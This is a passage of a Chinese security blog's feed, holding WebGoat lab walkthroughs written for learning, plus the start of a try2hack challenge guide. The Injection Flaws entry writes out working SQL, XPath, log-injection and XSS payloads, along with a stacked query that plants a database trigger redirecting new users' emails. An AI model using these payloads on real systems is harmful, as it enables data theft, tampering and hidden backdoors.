&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/12/try2hack通关教程/&quot;&gt;http://qimingyu.github.io/2016/05/12/try2hack通关教程/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;初衷&quot;&gt;&lt;a href=&quot;#初衷&quot; class=&quot;headerlink&quot; title=&quot;初衷&quot;&gt;&lt;/a&gt;初衷&lt;/h2&gt;&lt;p&gt;既然学完了WebGoat系列教程，下面来综合实战演练一下，同时也是检测一下自己的学习成果如何。&lt;br&gt;找了这样的一个网站，&lt;a href=&quot;http://www.try2hack.nl/&quot;&gt;try2hack&lt;/a&gt;，这是一个专门用来做网络攻击练习的网站，虽然比较老了，但用来做练习还是可以的。该网站一共有13道关卡，难度是逐步递增的，下面我们逐一开始挑战。&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络攻击" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/"/>
    
      <category term="try2hack" scheme="http://qimingyu.github.io/tags/try2hack/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Report Card（完结篇）</title>
    <link href="http://qimingyu.github.io/2016/05/10/Webgoat%E4%B9%8BReport_Card%EF%BC%88%E5%AE%8C%E7%BB%93%E7%AF%87%EF%BC%89/"/>
    <id>http://qimingyu.github.io/2016/05/10/Webgoat之Report_Card（完结篇）/</id>
    <published>2016-05-10T03:36:59.000Z</published>
    <updated>2016-05-10T05:01:45.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;大约历时一个月左右，系统学完了WebGoat5.2标准版的所有教程。虽然有些东西学的还是比较浅显，但还是加深了很多地方的理解。&lt;br&gt;人从一无所有出生，再到一无所有的离开，区区一辈子，80载，人世走一遭，总得留下些什么。因此一定要做一个有梦想的人，特别是在年轻的时候，在面临很多选择的时候，一定要坚持自己的梦想，不能有一丝一毫的妥协。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;学的越多，往往真有一种学无止境的感觉，学习是为了产出，学习是为了指导实践，学习是为了创造价值。因此，学习过程应该和产出过程相结合，构成良性循环。而世上知识千千万万，一个人要有所作为，则只能专于一点，我给自己定位于信息安全行业，希望能为中国的信息安全行业贡献自己的一份力量。&lt;br&gt;曾经在一篇博客里面看到这样一句话：做正确的事，然后等着被开除。当时我就为之一震，而如今我更深切的体会到说这句话更是需要勇气的，在公司往往会受迫于很多琐事，而无法专注于你希望做的事。这往往是个人理想与社会现实的偏差，这样的偏差并不可怕，也很正常。而面对这样的偏差时，我们一方面要积极修正自己的方向，因为这是来自于外界的反馈，另一方面，要有自己的独到的个性与不可替代性，这是自身价值的体现。&lt;br&gt;要让自己变得厚重、深沉而有魅力，应该永远关注自身势能的提高。学习信安十年，然后在行业内深深积累十年，然后再创业十年，这是我的大方向。深刻的剖析自身，要让自己变得透明，要敢于面对最真实的自己。无畏向前。&lt;/p&gt;
&lt;h2 id=&quot;成果&quot;&gt;&lt;a href=&quot;#成果&quot; class=&quot;headerlink&quot; title=&quot;成果&quot;&gt;&lt;/a&gt;成果&lt;/h2&gt;&lt;p&gt;如下是WebGoat课程的报告清单，也是我的学习成果，其中没有通过的是因为需要在开发版上才能完成。&lt;br&gt;&lt;img src=&quot;/images/webgoat_report_card/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/webgoat_report_card/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/webgoat_report_card/3.png&quot; alt=&quot;3&quot;&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/10/Webgoat之Report_Card（完结篇）/&quot;&gt;http://qimingyu.github.io/2016/05/10/Webgoat之Report_Card（完结篇）/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;大约历时一个月左右，系统学完了WebGoat5.2标准版的所有教程。虽然有些东西学的还是比较浅显，但还是加深了很多地方的理解。&lt;br&gt;人从一无所有出生，再到一无所有的离开，区区一辈子，80载，人世走一遭，总得留下些什么。因此一定要做一个有梦想的人，特别是在年轻的时候，在面临很多选择的时候，一定要坚持自己的梦想，不能有一丝一毫的妥协。
    
    </summary>
    
      <category term="安全感悟" scheme="http://qimingyu.github.io/categories/%E5%AE%89%E5%85%A8%E6%84%9F%E6%82%9F/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="学习成果" scheme="http://qimingyu.github.io/tags/%E5%AD%A6%E4%B9%A0%E6%88%90%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Injection Flaws</title>
    <link href="http://qimingyu.github.io/2016/05/06/Webgoat%E4%B9%8BInjection_Flaws/"/>
    <id>http://qimingyu.github.io/2016/05/06/Webgoat之Injection_Flaws/</id>
    <published>2016-05-06T06:32:01.000Z</published>
    <updated>2016-05-09T09:27:09.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Command-Injection&quot;&gt;&lt;a href=&quot;#Command-Injection&quot; class=&quot;headerlink&quot; title=&quot;Command Injection&quot;&gt;&lt;/a&gt;Command Injection&lt;/h2&gt;&lt;p&gt;这一节讲的是命令注入攻击。该攻击对任何一个以参数驱动的站点来说都是一个严重威胁。如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;该页面就是一个选择所需查看的文档，然后下方显示文档内容的页面。其存在的漏洞就是后台可以执行用户输入的命令，当我们拦截之后，修改参数如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;可以看到把我们服务器所开端口情况全部显示出来了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/3.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Blind-SQL-Injection&quot;&gt;&lt;a href=&quot;#Blind-SQL-Injection&quot; class=&quot;headerlink&quot; title=&quot;Blind SQL Injection&quot;&gt;&lt;/a&gt;Blind SQL Injection&lt;/h2&gt;&lt;p&gt;这一节主要讲盲注入，某些SQL注入是没有明确返回信息的，只能通过条件的“真”和“假”进行判断。攻击者必须充分利用查询语句，构造子查询语句。&lt;br&gt;如下图：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;这个输入框输入不同的数字他会给不同的反应。它会提示你Account Number是正确的还是错误的。&lt;br&gt;输入如下代码：&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;101 and ( ascii( substr(&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; first_name &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;where&lt;/span&gt; userid=&lt;span class=&quot;number&quot;&gt;15613&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) ) &amp;lt; &lt;span class=&quot;number&quot;&gt;77&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从user_data数据库表中把userid字段等于15613的名字找出来，然后求其字符子串，从第一个字符开始截取，截取一个字符长度，这样得到的是名字的一个字母，然后求其ascii值，与77比较，整条语句判断真假。&lt;br&gt;就这样一个个试，可以得到第一个字母是J，第二个字母是o,最后得到Joesph输入，返回正确。&lt;/p&gt;
&lt;h2 id=&quot;Numeric-SQL-Injection&quot;&gt;&lt;a href=&quot;#Numeric-SQL-Injection&quot; class=&quot;headerlink&quot; title=&quot;Numeric SQL Injection&quot;&gt;&lt;/a&gt;Numeric SQL Injection&lt;/h2&gt;&lt;p&gt;这节讲数字型注入攻击，如下图这是一个选择城市，然后出来相应天气预报的页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;通过截取数据分析发现，所提交的是城市的数字代码，我们把state字段改为如下即可以了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;最后攻击成功：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/5.png&quot; alt=&quot;5&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Log-Spoofing&quot;&gt;&lt;a href=&quot;#Log-Spoofing&quot; class=&quot;headerlink&quot; title=&quot;Log Spoofing&quot;&gt;&lt;/a&gt;Log Spoofing&lt;/h2&gt;&lt;p&gt;这节讲登陆欺骗，如图所示，这是一个登陆的页面，下面灰色部分是后台日志：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;现在是要求欺骗后台日志，也就是说一个人明明没有登陆进去，但它要在后台日志记录中显示登陆进去了。&lt;br&gt;因此可以插入如下内容：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Smith%0d%0aLogin Succeeded for username: admin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后日志上面会显示成这样：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/9.png&quot; alt=&quot;9&quot;&gt;&lt;br&gt;这主要是说用户注入内容到后台日志中了。&lt;br&gt;而当输入如下内容时：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;admin &amp;lt;script&amp;gt;alert(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie)&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;页面会显示如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/10.png&quot; alt=&quot;10&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;XPATH-Injection&quot;&gt;&lt;a href=&quot;#XPATH-Injection&quot; class=&quot;headerlink&quot; title=&quot;XPATH Injection&quot;&gt;&lt;/a&gt;XPATH Injection&lt;/h2&gt;&lt;p&gt;如下图所示，下面页面是输入账户名和密码查询工资的页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/11.png&quot; alt=&quot;11&quot;&gt;&lt;br&gt;我们的目标是看到其他员工的工资。XPATH 注入类似于SQL注入。通过未验证的输入创建一个XPATH 查询。&lt;br&gt;一般的XPATH查询，其页面代码如下：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt; dir = s.getContext().getRealPath(&lt;span class=&quot;string&quot;&gt;&quot;/lessons/XPATHInjection/EmployeesData.xml&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;File d = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; File(dir);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XPathFactory factory = XPathFactory.newInstance();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XPath xPath = factory.newXPath();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;InputSource inputSource = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; InputSource(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; FileInputStream(d));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt; expression = &lt;span class=&quot;string&quot;&gt;&quot;/employees/employee[loginID/text()=&#39;&quot;&lt;/span&gt; + username + &lt;span class=&quot;string&quot;&gt;&quot;&#39; and passwd/text()=&#39;&quot;&lt;/span&gt; + password + &lt;span class=&quot;string&quot;&gt;&quot;&#39;]&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nodes = (NodeList) xPath.evaluate(expression, inputSource, XPathConstants.NODESET);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当我们在浏览器中输入如下内容时：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Smith’ or 1=1 or ‘a’=’a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;则服务器获取的数据为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;expression = “/employees/employee[loginID/text()=’Smith’ or 1=1 or ‘a’=’a’ and passwd/text()=’password’]”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;服务器解析后的结果为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;expression = “/employees/employee[ ( loginID/text()=’Smith’ or 1=1 ) OR ( ‘a’=’a’ and passwd/text()=’password’ ) ]”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;浏览器显示页面为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/12.png&quot; alt=&quot;12&quot;&gt;&lt;br&gt;攻击成功。&lt;/p&gt;
&lt;h2 id=&quot;SQL-Injection&quot;&gt;&lt;a href=&quot;#SQL-Injection&quot; class=&quot;headerlink&quot; title=&quot;SQL Injection&quot;&gt;&lt;/a&gt;SQL Injection&lt;/h2&gt;&lt;h3 id=&quot;Stage-1&quot;&gt;&lt;a href=&quot;#Stage-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 1&quot;&gt;&lt;/a&gt;Stage 1&lt;/h3&gt;&lt;p&gt;第一步是字符串注入，要求以Neville的用户名，密码不知道的情况下登陆：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/16.png&quot; alt=&quot;16&quot;&gt;&lt;br&gt;因此需要拦截之后修改（一定要拦截后修改，因为直接在浏览器输入会有转义）：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/17.png&quot; alt=&quot;17&quot;&gt;&lt;br&gt;这样就可以顺利进入了。&lt;/p&gt;
&lt;h3 id=&quot;Stage-2&quot;&gt;&lt;a href=&quot;#Stage-2&quot; class=&quot;headerlink&quot; title=&quot;Stage 2&quot;&gt;&lt;/a&gt;Stage 2&lt;/h3&gt;&lt;p&gt;这部分需要我们使用参数化查询阻止SQL注入。但是这部分内容只有在开发版上才能完成，我用的是标准版。&lt;br&gt;应该修改webgoat/lessons/SQLInjection/ViewProfile.java文件中的getEmployeeProfile方法，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String query = &lt;span class=&quot;string&quot;&gt;&quot;SELECT employee.* &quot;&lt;/span&gt;+ &lt;span class=&quot;string&quot;&gt;&quot;FROM employee,ownership WHERE employee.userid = ownership.employee_id and &quot;&lt;/span&gt;+ &lt;span class=&quot;string&quot;&gt;&quot;ownership.employer_id = ? and ownership.employee_id = ?&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Connection connection = WebSession.getConnections(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	PreparedStatement statement = connection.prepareStatement(query,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	statement.setString(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, userId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	statement.setString(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, subjectUserId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ResultSet answer_results = statement.executeQuery();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Stage-3&quot;&gt;&lt;a href=&quot;#Stage-3&quot; class=&quot;headerlink&quot; title=&quot;Stage 3&quot;&gt;&lt;/a&gt;Stage 3&lt;/h3&gt;&lt;p&gt;这一节需要我们以普通用户的身份看到老板的简介：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/20.png&quot; alt=&quot;20&quot;&gt;&lt;br&gt;先以普通用户Larry的身份登陆进去：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/21.png&quot; alt=&quot;21&quot;&gt;&lt;br&gt;再点击ViewProfile进行抓包，后修改：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/19.png&quot; alt=&quot;19&quot;&gt;&lt;br&gt;最后提交看到老板简介：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/18.png&quot; alt=&quot;18&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Stage-4&quot;&gt;&lt;a href=&quot;#Stage-4&quot; class=&quot;headerlink&quot; title=&quot;Stage 4&quot;&gt;&lt;/a&gt;Stage 4&lt;/h3&gt;&lt;p&gt;这部分需要通过参数化查询防止这类攻击，与Stage 2的方法差不多。&lt;/p&gt;
&lt;h2 id=&quot;String-SQL-Injection&quot;&gt;&lt;a href=&quot;#String-SQL-Injection&quot; class=&quot;headerlink&quot; title=&quot;String SQL Injection&quot;&gt;&lt;/a&gt;String SQL Injection&lt;/h2&gt;&lt;p&gt;如下图所示是一个输入姓名查银行卡的页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/13.png&quot; alt=&quot;13&quot;&gt;&lt;br&gt;要求我们把所有人的银行卡信息都显示出来。输入如下代码：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Smith’ or 1=1 –&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;成功了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/14.png&quot; alt=&quot;14&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Database-Backdoors&quot;&gt;&lt;a href=&quot;#Database-Backdoors&quot; class=&quot;headerlink&quot; title=&quot;Database Backdoors&quot;&gt;&lt;/a&gt;Database Backdoors&lt;/h2&gt;&lt;p&gt;这一节讲的数据库后门攻击。数据库通常作为一个Web应用程序的后端来使用。此外，它也用来作为存储的媒介。它也可以被用来作为存储恶意活动的地方，如触发器。触发器是在数据库管理系统上调用另一个数据库操作，如insert, select, update or delete。举个例子：攻击者可以创建一个触发器，该触发器在创建新用户时，将每个新用户的Email地址设置为攻击者的地址。&lt;br&gt;正常情况下在如下页面输入工号，进行查询一些信息：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/15.png&quot; alt=&quot;15&quot;&gt;&lt;br&gt;后来发现客户端输入的查询语句没有在服务器端进行验证。&lt;br&gt;当我们输入如下代码时：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;101; update employee set salary=10000&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;服务器为我们执行了更新。&lt;br&gt;因此我们可以创建如下触发器：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email=’john@hackme.com’ WHERE userid = NEW.userid&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使没创建一个新用户的时候，自动为其填充为我们所希望的邮箱。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;SQL注入需要对数据库熟悉，并且对后台代码了解，内容还是比较多的。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/06/Webgoat之Injection_Flaws/&quot;&gt;http://qimingyu.github.io/2016/05/06/Webgoat之Injection_Flaws/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Command-Injection&quot;&gt;&lt;a href=&quot;#Command-Injection&quot; class=&quot;headerlink&quot; title=&quot;Command Injection&quot;&gt;&lt;/a&gt;Command Injection&lt;/h2&gt;&lt;p&gt;这一节讲的是命令注入攻击。该攻击对任何一个以参数驱动的站点来说都是一个严重威胁。如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_injection_flaws/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="注入攻击" scheme="http://qimingyu.github.io/tags/%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Web Services</title>
    <link href="http://qimingyu.github.io/2016/05/05/Webgoat%E4%B9%8BWeb_Services/"/>
    <id>http://qimingyu.github.io/2016/05/05/Webgoat之Web_Services/</id>
    <published>2016-05-05T07:51:40.000Z</published>
    <updated>2016-05-06T06:20:57.000Z</updated>
    
    <content type="html">&lt;p&gt;什么是Web Service？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web Service就是一种基于Web 的服务，但这个服务需要供求双方按照规定去做才能实现的服务。&lt;/li&gt;
&lt;li&gt;Web Service就是一个应用程序，它向外界暴露出一个能够通过Web进行调用的API。这就是说，你能够用编程的方法通过Web来调用这个应用程序。我们把能调用这个Web service 的应用程序叫做客户端程序。&lt;/li&gt;
&lt;li&gt;Web Service希望实现不同的系统之间能够用“软件-软件对话”的方式相互调用，打破了软件应用、网站和各种设备之间的格格不入的状态，实现“基于Web无缝集成”的目标。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;详细内容见&lt;a href=&quot;http://blog.csdn.net/weiguolee/article/details/6881411&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;，它有三要素：WSDL用来描述服务；UDDI用来注册和查找服务；SOAP用来在消费者和服务提供者之间传送消息。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Create-a-SOAP-Request&quot;&gt;&lt;a href=&quot;#Create-a-SOAP-Request&quot; class=&quot;headerlink&quot; title=&quot;Create a SOAP Request&quot;&gt;&lt;/a&gt;Create a SOAP Request&lt;/h2&gt;&lt;p&gt;第一部分要求我们创建一个SOAP的请求。&lt;br&gt;以下显示的是WSDL文档：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;我们展开portType：&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;发现有四种操作。因此WSDL中定义了4种操作。&lt;br&gt;第二步要填写方法getFirstNameRequest方法中参数的类型&lt;br&gt;&lt;img src=&quot;/images/webgoat_web_services/12.png&quot; alt=&quot;12&quot;&gt;&lt;br&gt;由上图可以看出是int类型的。&lt;br&gt;然后接着要发送一个SOAP的请求，点击按钮“Press to generate an HTTP request”，然后用burp进行拦截，拦截之后修改请求符合SOAP标准，如下：&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span 